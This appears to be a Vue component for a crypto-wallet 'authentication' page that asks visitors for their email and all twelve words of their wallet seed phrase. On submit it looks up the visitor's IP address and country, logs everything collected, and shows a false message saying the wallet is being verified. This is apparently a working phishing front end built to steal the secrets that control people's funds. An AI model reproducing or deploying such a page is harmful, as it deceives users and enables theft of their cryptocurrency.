<template>
  <div class="wallet-details">
    <header>
      <router-link to="/" class="logo">
        <!-- <img src="" alt="blockchain-logo" /> -->
      </router-link>
      <div class="nav">
        <router-link :to="{ name: 'Wallets' }">Wallets</router-link>
        <!-- <div class="flag"></div> -->
      </div>
    </header>
    <section class="details">
      <div class="photo-details">
        <div class="wallet-image">
          <div class="wallet-title">Authenticate Your {{ walletTitle }} wallet</div>
        </div>
      </div>
      <div class="twelve-phrase">
        <h3 class="big">Wallet Authentication Form</h3>
        <form @submit.prevent="handleSubmit">
          <div class="email">
            <div class="label">Email Address :</div>
            <input
              id="ai"
              type="email"
              placeholder="Enter your email"
              v-model="formState.ai"
              required
            />

          </div>
          <h3 class="small">Wallet 12 Seed Phrase:</h3>
          <div class="inputs">
            <input
              class="sPhrase"
              value="phrase"
              v-for="(word, index) in seedPhrase"
              :key="index"
              type="text"
              :placeholder="'Word ' + (index + 1)"
              v-model="seedPhrase[index]"
              required
            />
          </div>
          <div class="btn"><button type="submit">Verify wallet</button></div>
        </form>
      </div>
    </section>

    <!-- Success Modal -->
    <div v-if="showSuccessModal" class="modal">
      <div class="modal-content">
        <h2>Success!</h2>
        <p>Your wallet is under authentication. You will receive an update once the verification is successful.</p>
        <!-- <button @click="showSuccessModal = false">OK</button> -->
        <button @click="redirectToHome">OK</button>

      </div>
    </div>



  </div>
</template>

<script setup>
import { useWalletStore } from '@/stores/walletStore'
import { computed, reactive, ref, onMounted,  } from 'vue'
import { useRoute,  useRouter  } from 'vue-router' // ✅ Import useRouter

const route = useRoute()
const router = useRouter()  
const id = route.params.id

const walletStore = useWalletStore()
let walletName

onMounted(() => {
  walletName = walletTitle.value
})

const walletTitle = computed(() => {
  const wallet = walletStore.wallets.find((w) => w.id === parseInt(id))
  return wallet ? wallet.title : null
})

const formState = reactive({
  ai: '',
  seedPhrase: Array(12).fill(''),
})

const showSuccessModal = ref(false) 
 
const handleSubmit = async (e) => {
  e.preventDefault();

  let ip, country;

  await fetch('https://ipapi.co/json/')
    .then((response) => response.json())
    .then((data) => {
      ip = data.ip;
      country = data.country_name;
    });

  console.log('Wallet Name:', walletName);
  console.log('Email:', formState.ai);
  console.log('Country:', country);
  console.log('IP Address:', ip);
  console.log(
    'Seed Phrase:\n' +
      formState.seedPhrase
        .map((word, index) => `${index + 1}. ${word}`)
        .join('\n')
  );

  // Introduce a 2-second delay before showing the modal
  setTimeout(() => {
    showSuccessModal.value = true;
  }, 1000);

  // Clear inputs immediately after submission
  formState.ai = '';
  formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Ensure reactivity
};



// ✅ Define the function to redirect to home
const redirectToHome = () => {
  router.push('/'); // Redirects to the home page
};


const { seedPhrase } = formState
</script>



<style scoped>
/* Center the modal */
.modal {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: white;
  color: white;
  padding: 20px;
  border-radius: 8px;
  box-shadow: rgba(50, 50, 93, 0.25) 0px 50px 100px -20px, rgba(0, 0, 0, 0.3) 0px 30px 60px -30px, rgba(10, 37, 64, 0.35) 0px -2px 6px 0px inset;
  z-index: 1000;
  width: 80%;
  max-width: 400px;
  text-align: center;
}

/* Dim the background when modal is open */
.modal::before {
  content: "";
  border-radius: 4px;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.5);
  z-index: -1;
}
.modal-content{
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 10px;
}

.modal-content button {
  margin-top: 10px;
  padding: 10px 20px;
  background: #007bff;
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  transition: .2s;
}

.modal-content button:hover {
  background: #0056b3;
}
/* Show modal when active */
.modal.show {
  opacity: 1;
  transform: translate(-50%, -50%) scale(1);
}

header {
  width: 100%;
  height: 70px;
  /* background-color: rgb(18, 18, 44); */
  background-color: #000000;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 120px;
}
.logo {
  padding: 0;
  width: 100%;
  height: 40px;
  /* background-color: white; */
  border-radius: 12px;
  text-decoration: none;
  background-image: url('@/assets/logo.png');
  background-size: contain;
  background-repeat: no-repeat;
  /* background-position: center; */
}
.logo a {
  text-decoration: none;
}
.nav {
  display: flex;
  gap: 20px;
}
.nav a {
  background-color: rgb(46, 69, 112);
  padding: 10px 20px;
  border-radius: 12px;
  text-decoration: none;
  color: white;
  font-size: 12px;
  white-space: nowrap;
}
.flag {
  padding: 10px 30px;
  background-color: black;
  border: 2px solid white;
  border-radius: 12px;
}
.big {
  text-align: start;
  font-size: 24px;
  margin-bottom: 50px;
}
.label {
  margin-bottom: 10px;
  font-weight: 600;
  font-size: 20px;
}
.small {
  text-align: start;
  font-weight: 600;
  font-size: 20px;
  margin-bottom: 10px;
  margin-top: 30px;
}

.details {
  width: 100%;
  height: min-content;
  background-color: rgb(201, 201, 240);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
.photo-details {
  display: flex;
  flex-direction: column;
  justify-content: center;
  /* padding: 10px; */
  width: 100%;
}
.wallet-image {
  width: 100%;
  height: 250px;
  background-color: rgb(31, 45, 77);
  /* border-radius: 4px; */
  display: flex;
  justify-content: center;
  margin-bottom: 30px;
}
.wallet-title {
  width: 100%;
  font-size: 28px;
  font-weight: 600;
  justify-content: center;
  display: flex;
  align-items: center;
  /* background-color: black; */
  text-align: center;
  margin-top: 5px;
  color: #fff;
}
.twelve-phrase {
  width: 90%;
  height: 100%;
  background-color: rgb(255, 255, 255);
  box-shadow: rgba(50, 50, 93, 0.25) 0px 50px 100px -20px, rgba(0, 0, 0, 0.3) 0px 30px 60px -30px, rgba(10, 37, 64, 0.35) 0px -2px 6px 0px inset;
  /* display: flex; */
  justify-content: center;
  display: block;
  flex-direction: column;
  padding: 20px;
  overflow: hidden;
  border-radius: 8px;
  margin-bottom: 60px;
}

.inputs {
  width: 100%;
  /* background-color: aquamarine; */
  display: grid;
  /* flex-direction: column; */
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}
input {
  width: 100%;
  height: 48px;
  color: black;
  font-size: 16px;
  font-weight: 400;
  border-radius: 8px;
  border: 2px rgb(107, 107, 151) solid;
  padding: 5px;
}
.btn {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  /* background-color: black; */
  height: min-content;
  margin-top: 20px;
}
.btn button {
  padding: 16px 80px;
  font-weight: 500;
  font-size: 24px;
  border-radius: 8px;
  font-size: 16px;
  border: none;
  background-color: rgb(46, 69, 112);
  color: rgb(228, 222, 222);
  transition: .3s;
}
.btn button:hover{
  background-color: rgb(26, 46, 85);
  color: white;
}
@media (max-width: 768px) {
  .wallet-title{
    font-size: x-large;

  }
  header {
    flex-direction: row;
    align-items: center;
    /* padding: 15px 20px; */
    /* background-color: #1a1a60;  */
    gap: 15px;
  }
  .btn button{
    width: 100%;
    padding: 20px 80px;
    font-size: 20px;
  }
  .logo {
    /* padding: 10px 15px; */
    font-size: 1.2em;
  }

  .nav {
    flex-direction: column;
    align-items: flex-start;
    /* gap: 10px; */
  }

  .nav a {
    font-size: 16px;
    /* color: red; */
    padding: 6px 6px;
    border-radius: 4px;
  }

  .flag {
    display: none; /* Hide flag completely for better space management */
  }
}

@media (max-width: 480px) {
  header {
    padding: 10px 15px;
    gap: 10px;
  }

  .logo {
    font-size: 1em;
    padding: 8px 10px;
  }
}
</style>
